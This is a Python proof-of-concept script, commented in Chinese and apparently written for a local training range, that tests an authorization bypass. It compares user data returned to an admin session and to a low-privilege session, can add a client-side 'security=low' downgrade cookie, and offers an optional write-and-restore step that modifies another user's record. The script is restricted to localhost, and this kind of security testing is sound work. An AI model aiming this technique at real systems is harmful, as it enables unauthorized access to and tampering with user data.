#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AUTH-001 越权验证草案（仅限本地授权教学靶场，默认只读）。

对照 1：admin 会话 GET get_user_data.php（正常最小请求）
对照 2：普通用户会话 GET get_user_data.php（低权限请求）
可选写回环：普通用户会话 POST change_user_details.php，先记录原值，
提交无害标记，从 admin 的独立读取路径回查，再用原始值恢复。

会话 Cookie 只从命令行参数或本地文件读取，脚本不打印 Cookie 内容。
"""
import argparse
import http.client
import json
import sys
from urllib.parse import urlsplit

ALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}
DEFAULT_GET_PATH = '/vulnerabilities/authbypass/get_user_data.php'
DEFAULT_UPDATE_PATH = '/vulnerabilities/authbypass/change_user_details.php'


def parse_base(base):
    parts = urlsplit(base)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('基址必须是 http 或 https')
    host = parts.hostname or ''
    if host not in ALLOWED_HOSTS:
        raise SystemExit('仅允许 localhost/127.0.0.1/::1，实际为 %r' % (host,))
    port = parts.port or (443 if parts.scheme == 'https' else 80)
    return parts.scheme, host, port, parts.path.rstrip('/')


def request(scheme, host, port, prefix, method, path, cookie, payload, timeout):
    """发送单个请求，不跟随重定向，返回 status/Location/body。"""
    cls = http.client.HTTPSConnection if scheme == 'https' else http.client.HTTPConnection
    conn = cls(host, port, timeout=timeout)
    headers = {'Accept': 'application/json', 'User-Agent': 'auth001-lab-poc/1.0'}
    if cookie:
        headers['Cookie'] = cookie
    body = None
    if payload is not None:
        body = json.dumps(payload).encode('utf-8')
        headers['Content-Type'] = 'application/json'
    try:
        conn.request(method, prefix + path, body=body, headers=headers)
        resp = conn.getresponse()
        text = resp.read().decode('utf-8', 'replace')
        return {'status': resp.status, 'location': resp.getheader('Location'), 'body': text}
    finally:
        conn.close()


def parse_json(text):
    try:
        return json.loads(text)
    except ValueError:
        return None


def user_list(payload):
    if isinstance(payload, list):
        return [row for row in payload if isinstance(row, dict)]
    return None


def ids_of(rows):
    return [row.get('user_id') for row in rows]


def read_cookie(inline, path):
    if path:
        with open(path, 'r', encoding='utf-8') as handle:
            return handle.read().strip()
    return (inline or '').strip()


def main():
    parser = argparse.ArgumentParser(description='AUTH-001 越权只读/写回环验证草案')
    parser.add_argument('--base', required=True,
                        help='靶场基址，例如 http://127.0.0.1:8080')
    parser.add_argument('--admin-cookie-file', default=None)
    parser.add_argument('--user-cookie-file', default=None)
    parser.add_argument('--admin-cookie', default=None,
                        help='仅调试用；优先使用 --admin-cookie-file')
    parser.add_argument('--user-cookie', default=None,
                        help='仅调试用；优先使用 --user-cookie-file')
    parser.add_argument('--get-path', default=DEFAULT_GET_PATH)
    parser.add_argument('--update-path', default=DEFAULT_UPDATE_PATH)
    parser.add_argument('--force-security-cookie', default=None,
                        help='附加 Cookie security=<值>，例如 low，用于验证等级取自客户端 Cookie')
    parser.add_argument('--enable-write', action='store_true',
                        help='显式开启写回环验证（默认关闭，优先只读）')
    parser.add_argument('--target-user-id', type=int, default=None,
                        help='专用测试用户的 user_id，禁止使用真实账号')
    parser.add_argument('--marker', default='LAB_AUTH001_MARK',
                        help='写入的无害标记，回查后恢复原值')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    scheme, host, port, prefix = parse_base(args.base)
    admin_cookie = read_cookie(args.admin_cookie, args.admin_cookie_file)
    user_cookie = read_cookie(args.user_cookie, args.user_cookie_file)
    if not admin_cookie or not user_cookie:
        raise SystemExit('需要 --admin-cookie-file 与 --user-cookie-file（或对应内联参数）')

    downgrade = ''
    if args.force_security_cookie:
        downgrade = '; security=' + args.force_security_cookie

    print('[1] admin 正常请求 GET %s' % args.get_path)
    admin_res = request(scheme, host, port, prefix, 'GET', args.get_path,
                        admin_cookie, None, args.timeout)
    admin_rows = user_list(parse_json(admin_res['body']))
    print('    HTTP %s，JSON 数组：%s' % (admin_res['status'],
                                       'yes' if admin_rows is not None else 'no'))
    if admin_rows is not None:
        print('    用户总数：%d，user_id：%s' % (len(admin_rows), ids_of(admin_rows)))
    else:
        print('    响应体前 200 字符：%r' % admin_res['body'][:200])

    print('[2] 普通用户低权限请求 GET %s%s' % (
        args.get_path, '（附加 security 降级 Cookie）' if downgrade else ''))
    user_res = request(scheme, host, port, prefix, 'GET', args.get_path,
                       user_cookie + downgrade, None, args.timeout)
    user_rows = user_list(parse_json(user_res['body']))
    print('    HTTP %s，JSON 数组：%s' % (user_res['status'],
                                       'yes' if user_rows is not None else 'no'))
    if user_rows is not None:
        print('    用户总数：%d，user_id：%s' % (len(user_rows), ids_of(user_rows)))
    else:
        print('    响应体前 200 字符：%r' % user_res['body'][:200])

    read_signal = (
        user_res['status'] == 200
        and user_rows is not None
        and len(user_rows) > 0
        and admin_rows is not None
        and len(user_rows) == len(admin_rows)
    )
    print('[3] 只读判定：低权限会话%s获得与 admin 相同的用户列表'
          % ('' if read_signal else '未'))

    if not args.enable_write:
        print('[4] 写操作未开启（默认只读）；如需写回环请显式加 '
              '--enable-write --target-user-id N')
        return 0

    if args.target_user_id is None:
        raise SystemExit('写回环必须用 --target-user-id 指定专用测试用户，禁止使用真实账号')
    if admin_rows is None:
        raise SystemExit('无法取得基线用户列表，终止写回环')

    target = [row for row in admin_rows
              if str(row.get('user_id')) == str(args.target_user_id)]
    if not target:
        raise SystemExit('admin 列表中不存在 user_id=%s，终止写回环' % args.target_user_id)
    original_first = target[0].get('first_name') or ''
    original_surname = target[0].get('surname') or ''
    if args.marker in original_first or args.marker in original_surname:
        raise SystemExit('测试对象已带标记，请先人工恢复再运行')
    marker_first = original_first + args.marker

    print('[5] 记录原值：user_id=%s first_name=%r surname=%r'
          % (args.target_user_id, original_first, original_surname))
    payload = {'id': args.target_user_id,
               'first_name': marker_first,
               'surname': original_surname}
    write_res = request(scheme, host, port, prefix, 'POST', args.update_path,
                        user_cookie + downgrade, payload, args.timeout)
    print('    低权限 POST HTTP %s，响应：%r' % (write_res['status'],
                                              write_res['body'][:200]))

    verify = request(scheme, host, port, prefix, 'GET', args.get_path,
                     admin_cookie, None, args.timeout)
    verify_rows = user_list(parse_json(verify['body'])) or []
    current = [row for row in verify_rows
               if str(row.get('user_id')) == str(args.target_user_id)]
    marked = bool(current) and current[0].get('first_name') == marker_first
    print('[6] 独立回查（admin GET）：%s' % ('标记已写入' if marked else '未观察到标记'))

    restore_payload = {'id': args.target_user_id,
                       'first_name': original_first,
                       'surname': original_surname}
    request(scheme, host, port, prefix, 'POST', args.update_path,
            admin_cookie, restore_payload, args.timeout)
    final = request(scheme, host, port, prefix, 'GET', args.get_path,
                    admin_cookie, None, args.timeout)
    final_rows = user_list(parse_json(final['body'])) or []
    final_target = [row for row in final_rows
                    if str(row.get('user_id')) == str(args.target_user_id)]
    restored = (bool(final_target)
                and final_target[0].get('first_name') == original_first
                and final_target[0].get('surname') == original_surname)
    print('[7] 恢复原值：%s' % ('成功' if restored else '未确认，请人工恢复'))
    if not restored:
        return 2
    return 0 if marked else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except (OSError, http.client.HTTPException) as exc:
        print('请求失败（连接或协议错误）：%r' % (exc,), file=sys.stderr)
        sys.exit(3)
